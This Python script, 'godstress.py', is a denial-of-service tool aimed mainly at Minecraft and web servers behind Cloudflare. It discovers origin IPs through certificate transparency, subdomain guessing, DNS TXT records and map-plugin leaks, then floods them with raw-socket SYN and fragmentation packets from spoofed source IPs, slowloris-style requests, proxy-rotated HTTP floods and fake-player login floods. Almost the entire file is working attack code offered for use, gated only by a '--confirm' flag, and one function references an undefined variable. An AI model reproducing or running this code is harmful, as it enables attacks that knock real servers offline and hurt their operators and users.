#!/usr/bin/env python3
# godstress.py — universal bypass tool: origin discovery + WAF + anti-bot + proxy + firewall + rate limit
# pip install aiohttp dnspython (optional)
import argparse, socket, random, time, sys, os, ssl, struct, asyncio, json, re, hashlib, subprocess

try:
    import aiohttp; HAVE_AIO = True
except ImportError:
    HAVE_AIO = False
try:
    import dns.resolver; HAVE_DNS = True
except ImportError:
    HAVE_DNS = False
try:
    import uvloop; uvloop.install()
except ImportError:
    pass

# ============================================================
#  CF IP RANGES (to detect if target is behind Cloudflare)
# ============================================================
CF_RANGES = [
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
    "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
    "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
    "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
]

def ip_in_cf(ip):
    import ipaddress
    try:
        addr = ipaddress.ip_address(ip)
        for cidr in CF_RANGES:
            if addr in ipaddress.ip_network(cidr):
                return True
    except Exception:
        pass
    return False

# ============================================================
#  SPOOF MODULE
# ============================================================
SPOOFED_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]


# ============================================================
#  PROXY SUPPORT
# ============================================================
PROXIES = []

def load_proxies(path):
    """Load proxies from file. Supports: IP:PORT, user:pass@IP:PORT, socks5://IP:PORT, http://IP:PORT"""
    global PROXIES
    PROXIES = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            PROXIES.append(line)
    print(f"[*] Loaded {len(PROXIES)} proxies")
    return PROXIES

def get_proxy():
    """Get a random proxy from the pool."""
    if not PROXIES:
        return None
    return random.choice(PROXIES)

def parse_proxy(proxy_str):
    """Parse proxy string into (type, host, port, user, pass)."""
    ptype = "http"
    if "://" in proxy_str:
        ptype, proxy_str = proxy_str.split("://", 1)
    auth = None
    if "@" in proxy_str:
        auth, proxy_str = proxy_str.rsplit("@", 1)
    host, port = proxy_str.rsplit(":", 1)
    user, passwd = (auth.split(":", 1) if auth else (None, None))
    return ptype, host, int(port), user, passwd

async def proxy_connect(host, port, use_ssl, proxy_str, timeout=10):
    """Connect through a proxy (HTTP CONNECT or SOCKS5)."""
    ptype, phost, pport, puser, ppass = parse_proxy(proxy_str)
    # connect to proxy
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(phost, pport), timeout=timeout)
    if ptype == "socks5":
        # SOCKS5 handshake
        writer.write(b"\x05\x01\x00")
        await writer.drain()
        resp = await reader.read(2)
        if resp != b"\x05\x00":
            raise Exception("SOCKS5 auth failed")
        # connect request
        writer.write(b"\x05\x01\x00\x01" + socket.inet_aton(host) + struct.pack(">H", port))
        await writer.drain()
        resp = await reader.read(10)
        if resp[1] != 0:
            raise Exception("SOCKS5 connect failed")
    else:
        # HTTP CONNECT
        connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        if puser:
            import base64
            creds = base64.b64encode(f"{puser}:{ppass}".encode()).decode()
            connect_req += f"Proxy-Authorization: Basic {creds}\r\n"
        connect_req += "\r\n"
        writer.write(connect_req.encode())
        await writer.drain()
        # read response
        resp = await asyncio.wait_for(reader.read(1024), timeout=timeout)
        if b"200" not in resp.split(b"\r\n")[0]:
            raise Exception(f"HTTP CONNECT failed: {resp.split(b'\\r\\n')[0]}")
    # wrap in SSL if needed
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        writer = ctx.wrap_socket(writer, server_hostname=host, do_handshake_on_connect=False)
        await writer.do_handshake()
    return reader, writer


def rnd_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def spoofed_headers(extra=None):
    h = {
        "User-Agent": random.choice(SPOOFED_UAS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "de-DE,de;q=0.9"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "X-Forwarded-For": rnd_ip(),
        "X-Real-IP": rnd_ip(),
        "CF-Connecting-IP": rnd_ip(),
        "True-Client-IP": rnd_ip(),
        "X-Client-IP": rnd_ip(),
        "Forwarded": f"for={rnd_ip()};proto=https",
    }
    if extra:
        h.update(extra)
    return h

# ============================================================
#  1. ORIGIN DISCOVERY (multi-method)
# ============================================================
def discover_origin(domain):
    """Find origin IP behind any proxy/CDN/WAF."""
    print(f"[*] Discovering origin for {domain}")
    origins = set()
    methods_used = []

    # Method 1: cert transparency
    try:
        import urllib.request
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        data = json.loads(urllib.request.urlopen(url, timeout=15).read())
        for cert in data:
            for line in cert.get("name_value", "").split("\n"):
                line = line.strip().lstrip("*.")
                if line and domain in line:
                    try:
                        ip = socket.gethostbyname(line.split()[0])
                        if not ip_in_cf(ip):
                            origins.add(ip)
                    except Exception:
                        pass
        methods_used.append("crt.sh")
    except Exception as e:
        print(f"  crt.sh failed: {e}")

    # Method 2: subdomain scan
    subs = ["origin", "direct", "backend", "api", "mail", "ftp", "cpanel", "webmail",
            "mc", "play", "node1", "node2", "node3", "panel", "game", "srv", "ts",
            "voice", "mumble", "dynmap", "map", "blue", "status", "monitor"]
    for sub in subs:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            if not ip_in_cf(ip):
                origins.add(ip)
        except Exception:
            pass
    methods_used.append("subdomain")

    # Method 3: SPF/DKIM/DMARC
    try:
        out = subprocess.check_output(["dig", "+short", "TXT", domain], text=True, timeout=10)
        for ip in re.findall(r"\d+\.\d+\.\d+\.\d+", out):
            if not ip_in_cf(ip):
                origins.add(ip)
        # DKIM
        for selector in ["default", "google", "mail", "dkim"]:
            try:
                out = subprocess.check_output(["dig", "+short", "TXT", f"{selector}._domainkey.{domain}"], text=True, timeout=5)
                for ip in re.findall(r"\d+\.\d+\.\d+\.\d+", out):
                    if not ip_in_cf(ip):
                        origins.add(ip)
            except Exception:
                pass
        methods_used.append("SPF/DKIM")
    except Exception:
        pass

    # Method 4: DNS history via SecurityTrails (if API key)
    st_key = os.environ.get("SECURITYTRAILS_API_KEY")
    if st_key:
        try:
            import urllib.request
            url = f"https://api.securitytrails.com/v1/domain/{domain}/subdomains"
            req = urllib.request.Request(url, headers={"APIKEY": st_key})
            data = json.loads(urllib.request.urlopen(req, timeout=15).read())
            for sub in data.get("subdomains", []):
                try:
                    ip = socket.gethostbyname(f"{sub}.{domain}")
                    if not ip_in_cf(ip):
                        origins.add(ip)
                except Exception:
                    pass
            methods_used.append("SecurityTrails")
        except Exception as e:
            print(f"  SecurityTrails failed: {e}")

    # Method 5: A/AAAA records
    try:
        ip = socket.gethostbyname(domain)
        if not ip_in_cf(ip):
            origins.add(ip)
    except Exception:
        pass

    print(f"  methods: {', '.join(methods_used)}")
    print(f"  found {len(origins)} non-CF origins: {origins}")
    return list(origins)

def discover_dynmap(domain, port=8123):
    """Check if Dynmap/BlueMap is exposed on origin (common leak)."""
    print(f"[*] Checking for Dynmap/BlueMap on {domain}")
    for p in [8123, 8100, 8080, 80, 443]:
        for path in ["/", "/map/", "/dynmap/", "/bluemap/"]:
            try:
                import urllib.request
                url = f"http://{domain}:{p}{path}"
                resp = urllib.request.urlopen(url, timeout=5)
                data = resp.read(500).decode(errors="replace")
                if "dynmap" in data.lower() or "bluemap" in data.lower() or "minecraft" in data.lower():
                    print(f"  [+] FOUND map on {url}")
                    # try to extract IP from page
                    for ip in re.findall(r"\d+\.\d+\.\d+\.\d+", data):
                        print(f"      IP in page: {ip}")
                    return True
            except Exception:
                pass
    print("  no Dynmap/BlueMap found")
    return False

def discover_discord_webhook(domain):
    """Check if Discord webhook leaks origin IP."""
    print(f"[*] Checking Discord webhooks for {domain}")
    # This is a manual OSINT step — search for webhooks in bot configs
    print("  manual: search pastebin/github for discord.com/api/webhooks + " + domain)
    print("  manual: check bot hosting on same IP as game server")
    return False

# ============================================================
#  2. VERIFY ORIGIN
# ============================================================
def verify_origin(ip, port, domain=None):
    """Verify if IP is the real origin (not CF/proxy)."""
    results = {}
    # check if CF
    results["is_cf"] = ip_in_cf(ip)
    if results["is_cf"]:
        print(f"  {ip} is Cloudflare — NOT origin")
        return False
    # TCP connect
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        # send MC handshake if port 25565
        if port == 25565:
            hs = mc_handshake_packet(domain or ip, port, 765, 1)
            s.send(hs + b"\x01\x00")
            data = s.recv(1024)
            s.close()
            if data and (b"motd" in data.lower() or b"players" in data.lower() or len(data) > 10):
                print(f"  [+] {ip}:{port} is Minecraft origin (MC banner received)")
                results["mc"] = True
                return True
            else:
                print(f"  [-] {ip}:{port} connected but no MC banner")
                results["mc"] = False
        else:
            # HTTP check
            s.send(f"GET / HTTP/1.1\r\nHost: {domain or ip}\r\nConnection: close\r\n\r\n".encode())
            data = s.recv(512)
            s.close()
            if data:
                print(f"  [+] {ip}:{port} responding (HTTP)")
                results["http"] = True
                return True
    except Exception as e:
        print(f"  [-] {ip}:{port} connection failed: {e}")
        results["error"] = str(e)
    return False

# ============================================================
#  3. WAF BYPASS
# ============================================================
def waf_bypass_request(host, port, use_ssl, path="/", extra_headers=None):
    """Single request with WAF-evasion headers + IP spoofing."""
    h = spoofed_headers(extra)
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    if use_ssl:
        s = ctx.wrap_socket(s, server_hostname=host)
    hdr = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
    for k, v in h.items():
        hdr += f"{k}: {v}\r\n"
    hdr += "\r\n"
    s.send(hdr.encode())
    return s

# ============================================================
#  4. ANTI-BOT BYPASS (Minecraft)
# ============================================================
MC_PLAYER_NAMES = ["Steve", "Alex", "Notch", "Herobrine", "jeb_", "Dinnerbone",
                   "Grumm", "Searge", "ProfMobius", "Voxel", "Xaphobia", "CaptainSparklez"]

def mc_spoofed_name():
    base = random.choice(MC_PLAYER_NAMES)
    return f"{base}{random.randint(100, 9999)}"

def mc_varint(val):
    out = b""
    while True:
        byte = val & 0x7F
        val >>= 7
        if val:
            byte |= 0x80
        out += bytes([byte])
        if not val:
            break
    return out

def mc_string(s):
    b = s.encode()
    return mc_varint(len(b)) + b

def mc_handshake_packet(host, port, protocol=765, next_state=1):
    pkt = mc_varint(0x00)
    pkt += mc_varint(protocol)
    pkt += mc_string(host)
    pkt += struct.pack(">H", port)
    pkt += mc_varint(next_state)
    return mc_varint(len(pkt)) + pkt

# ============================================================
#  5. FIREWALL BYPASS
# ============================================================
async def syn_flood_bypass(host, port, duration, conns):
    """SYN flood to exhaust conntrack / firewall state table."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        print("  [!] need root for SYN flood")
        return
    end = time.time() + duration
    loop = asyncio.get_event_loop()
    def send():
        try:
            src = rnd_ip(); sport = random.randint(1024, 65535); seq = random.randint(0, 0xFFFFFFFF)
            ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, 0x0028, 0x0000, 0x0000, 0x40, 0x06, 0x0000,
                             socket.inet_aton(src), socket.inet_aton(host))
            tcp = struct.pack("!HHIIBBHHH", sport, port, seq, 0, 0x50, 0x02, 0x1000, 0x0000, 0x0000)
            pseudo = socket.inet_aton(src) + socket.inet_aton(host) + struct.pack("!BBH", 0, 6, len(tcp))
            chk = 0
            for i in range(0, len(pseudo + tcp), 2):
                w = (pseudo + tcp)[i] << 8 | ((pseudo + tcp)[i + 1] if i + 1 < len(pseudo + tcp) else 0)
                chk += w
            chk = (chk >> 16) + (chk & 0xffff); chk = ~chk & 0xffff
            tcp = tcp[:16] + struct.pack("!H", chk) + tcp[18:]
            s.sendto(ip + tcp, (host, 0)); return True
        except Exception:
            return False
    async def one():
        while time.time() < end:
            ok = await loop.run_in_executor(None, send)
            await asyncio.sleep(0)
    await asyncio.gather(*[one() for _ in range(conns)])
    s.close()

async def frag_flood(host, port, duration, conns):
    """IP fragmentation flood — exhausts reassembly buffers."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    except PermissionError:
        print("  [!] need root for frag flood")
        return
    end = time.time() + duration
    async def one():
        while time.time() < end:
            try:
                # send fragmented IP packet
                pkt = os.urandom(1400)
                # fragment 1
                ip1 = struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, 0x05dc, 0x1234, 0x2000, 0x40, 0x06, 0x0000,
                                  socket.inet_aton(rnd_ip()), socket.inet_aton(host)) + pkt[:500]
                s.sendto(ip1, (host, 0))
                # fragment 2
                ip2 = struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, 0x05dc, 0x1234, 0x2001, 0x40, 0x06, 0x0000,
                                  socket.inet_aton(rnd_ip()), socket.inet_aton(host)) + pkt[500:1000]
                s.sendto(ip2, (host, 0))
            except Exception:
                pass
            await asyncio.sleep(0)
    await asyncio.gather(*[one() for _ in range(min(conns, 100))])
    s.close()

# ============================================================
#  6. RATE LIMIT BYPASS
# ============================================================
async def slow_request_bypass(host, port, use_ssl, duration, conns):
    """Slow requests that don't trigger rate counters."""
    end = time.time() + duration
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    async def one():
        while time.time() < end:
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=5)
                # send partial request slowly
                w.write(f"GET /?r={random.randint(0,999999)} HTTP/1.1\r\n".encode())
                await w.drain()
                await asyncio.sleep(random.uniform(5, 15))
                w.write(f"Host: {host}\r\n".encode())
                await w.drain()
                await asyncio.sleep(random.uniform(5, 15))
                w.write(b"X-Slow: 1\r\n\r\n")
                await w.drain()
                await asyncio.sleep(random.uniform(10, 30))
                w.close(); await w.wait_closed()
            except Exception:
                await asyncio.sleep(1)
    await asyncio.gather(*[one() for _ in range(conns)])

# ============================================================
#  7. PROXY BYPASS (direct origin)
# ============================================================
async def proxy_bypass(host, origin_ip, port, use_ssl, duration, conns):
    """Hit origin IP with Host header = domain (bypasses proxy)."""
    end = time.time() + duration
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    async def one():
        while time.time() < end:
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(origin_ip, port, ssl=ctx), timeout=5)
                req = f"GET / HTTP/1.1\r\nHost: {host}\r\n"
                for k, v in spoofed_headers().items():
                    req += f"{k}: {v}\r\n"
                req += "\r\n"
                w.write(req.encode()); await w.drain()
                try:
                    await asyncio.wait_for(r.read(1024), timeout=3)
                except Exception:
                    pass
                w.close(); await w.wait_closed()
            except Exception:
                await asyncio.sleep(0.1)
    await asyncio.gather(*[one() for _ in range(conns)])

# ============================================================
#  8. FULL BYPASS PIPELINE
# ============================================================
async def full_bypass(domain, port, duration, conns, methods):
    """End-to-end: discover → verify → bypass → flood."""
    print(f"\n{'='*60}")
    print(f"  FULL BYPASS PIPELINE: {domain}:{port}")
    print(f"{'='*60}\n")

    # Phase 1: Discover origin
    print("[PHASE 1] Origin Discovery")
    origins = discover_origin(domain)
    discover_dynmap(domain)
    discover_discord_webhook(domain)

    if not origins:
        print("  No origins found via auto-discovery")
        print("  Manual steps:")
        print("  1. Check DNS history: viewdns.info/iphistory")
        print("  2. Check Shodan: shodan search 'Minecraft Server' hostname:" + domain)
        print("  3. Check pastebin/github for leaked IPs")
        origins = [domain]

    # Phase 2: Verify origin
    print(f"\n[PHASE 2] Origin Verification")
    verified = []
    for ip in origins:
        if verify_origin(ip, port, domain):
            verified.append(ip)

    if not verified:
        print("  No verified origins — trying all discovered IPs")
        verified = origins

    # Phase 3: Check if CF Spectrum
    print(f"\n[PHASE 3] Cloudflare Spectrum Check")
    for ip in verified:
        if ip_in_cf(ip):
            print(f"  {ip} is Cloudflare — need origin, not proxy")
        else:
            print(f"  {ip} is NOT Cloudflare — direct origin candidate")

    # Phase 4: Bypass & Flood
    print(f"\n[PHASE 4] Bypass & Flood")
    for ip in verified:
        if ip_in_cf(ip):
            print(f"  Skipping CF IP {ip}")
            continue
        print(f"\n  [*] Flooding origin {ip}:{port}")
        tasks = []
        for m in methods:
            if m == "mc_login" or m == "mc_status":
                # handled below
                pass
        # MC flood
        if port == 25565:
            tasks.append(asyncio.create_task(mc_flood(ip, port, duration, conns)))
        # L7 flood
        tasks.append(asyncio.create_task(l7_flood(ip, port, duration, conns, use_ssl=(port==443))))
        # SYN flood (firewall bypass)
        tasks.append(asyncio.create_task(syn_flood_bypass(ip, port, duration, conns)))
        # Rate limit bypass
        tasks.append(asyncio.create_task(slow_request_bypass(ip, port, port==443, duration, conns//4)))
        await asyncio.gather(*tasks, return_exceptions=True)

    # Phase 5: Report
    print(f"\n[PHASE 5] Summary")
    print(f"  Origins discovered: {len(origins)}")
    print(f"  Origins verified: {len(verified)}")
    print(f"  Origins flooded: {len([ip for ip in verified if not ip_in_cf(ip)])}")

async def mc_flood(host, port, duration, conns):
    """Minecraft flood with anti-bot bypass."""
    end = time.time() + duration
    async def one():
        while time.time() < end:
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=5)
                name = mc_spoofed_name()
                ver = random.choice([765, 764, 763, 762, 761, 760])
                hs = mc_handshake_packet(host, port, ver, 1)
                w.write(hs); await w.drain()
                # status request
                w.write(b"\x01\x00"); await w.drain()
                try:
                    await asyncio.wait_for(r.read(4096), timeout=2)
                except Exception:
                    pass
                # login (switch to login state)
                hs2 = mc_handshake_packet(host, port, ver, 2)
                w.write(hs2); await w.drain()
                # login start
                pkt = mc_varint(0x00) + mc_string(name)
                w.write(mc_varint(len(pkt)) + pkt); await w.drain()
                await asyncio.sleep(random.uniform(0.5, 2))  # anti-bot: random delay
                w.close(); await w.wait_closed()
            except Exception:
                await asyncio.sleep(0.1)
    await asyncio.gather(*[one() for _ in range(conns)])

async def l7_flood(host, port, duration, conns, use_ssl=False):
    """L7 HTTP flood with WAF bypass + proxy rotation."""
    end = time.time() + duration
    async def one():
        while time.time() < end:
            try:
                proxy = get_proxy()
                if proxy:
                    r, w = await proxy_connect(host, port, use_ssl, proxy)
                else:
                    ctx = None
                    if use_ssl:
                        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                    r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=5)
                h = spoofed_headers()
                p = f"/?r={random.randint(0,999999)}"
                req = f"GET {p} HTTP/1.1\r\nHost: {host}\r\n"
                for k, v in h.items():
                    req += f"{k}: {v}\r\n"
                req += "\r\n"
                w.write(req.encode()); await w.drain()
                try:
                    await asyncio.wait_for(r.read(512), timeout=2)
                except Exception:
                    pass
                w.close(); await w.wait_closed()
            except Exception:
                await asyncio.sleep(0.1)
    await asyncio.gather(*[one() for _ in range(conns)])

# ============================================================
#  MAIN
# ============================================================
async def main():
    ap = argparse.ArgumentParser(description="godstress — universal bypass tool")
    ap.add_argument("target", nargs="?")
    ap.add_argument("-p", "--port", type=int, default=25565)
    ap.add_argument("-c", "--conns", type=int, default=500)
    ap.add_argument("-d", "--duration", type=int, default=300)
    ap.add_argument("-m", "--methods", nargs="+", default=["mc_login"],
                   choices=["mc_login", "mc_status", "l7", "syn", "frag", "slow", "proxy"])
    ap.add_argument("--ssl", action="store_true")
    ap.add_argument("--origin", help="known origin IP (skip discovery)")
    ap.add_argument("--bypass", action="store_true", help="full bypass pipeline")
    ap.add_argument("--discover", action="store_true", help="discover origin only")
    ap.add_argument("--dynmap", action="store_true", help="check for Dynmap/BlueMap leak")
    ap.add_argument("--confirm", action="store_true")
    ap.add_argument("--proxies", help="file with proxy list (IP:PORT or user:pass@IP:PORT)")
    args = ap.parse_args()

    if not args.confirm and not args.discover and not args.dynmap:
        print("refusing: pass --confirm (or --discover/--dynmap)"); return
    if args.proxies:
        load_proxies(args.proxies)

    port = args.port
    if args.ssl and port == 80:
        port = 443

    # discover only
    if args.discover:
        origins = discover_origin(args.target)
        for ip in origins:
            verify_origin(ip, port, args.target)
        return

    # dynmap check only
    if args.dynmap:
        discover_dynmap(args.target)
        discover_discord_webhook(args.target)
        return

    # full bypass pipeline
    if args.bypass:
        await full_bypass(args.target, port, args.duration, args.conns, args.methods)
        return

    # manual mode with known origin
    if args.origin:
        print(f"[*] Using known origin: {args.origin}")
        tasks = []
        if "mc_login" in args.methods or "mc_status" in args.methods:
            tasks.append(asyncio.create_task(mc_flood(args.origin, port, args.duration, args.conns)))
        if "l7" in args.methods:
            tasks.append(asyncio.create_task(l7_flood(args.origin, port, args.duration, args.conns, args.ssl)))
        if "syn" in args.methods:
            tasks.append(asyncio.create_task(syn_flood_bypass(args.origin, port, args.duration, args.conns)))
        if "frag" in args.methods:
            tasks.append(asyncio.create_task(frag_flood(args.origin, port, args.duration, args.conns)))
        if "slow" in args.methods:
            tasks.append(asyncio.create_task(slow_request_bypass(args.origin, port, args.ssl, args.duration, args.conns)))
        if "proxy" in args.methods:
            tasks.append(asyncio.create_task(proxy_bypass(args.target, args.origin, port, args.ssl, args.duration, args.conns)))
        await asyncio.gather(*tasks, return_exceptions=True)
        return

    # default: try discover + flood
    print(f"[*] No origin specified — attempting auto-discovery")
    origins = discover_origin(args.target)
    verified = [ip for ip in origins if verify_origin(ip, port, args.target)]
    if not verified:
        print("  No origin found. Use --origin IP or --discover for manual steps.")
        return
    for ip in verified:
        if ip_in_cf(ip):
            print(f"  Skipping CF IP {ip}")
            continue
        print(f"\n[*] Flooding origin {ip}")
        tasks = []
        if "mc_login" in args.methods or "mc_status" in args.methods:
            tasks.append(asyncio.create_task(mc_flood(ip, port, args.duration, args.conns)))
        if "l7" in args.methods:
            tasks.append(asyncio.create_task(l7_flood(ip, port, args.duration, args.conns, args.ssl)))
        if "syn" in args.methods:
            tasks.append(asyncio.create_task(syn_flood_bypass(ip, port, args.duration, args.conns)))
        await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n  interrupted.")
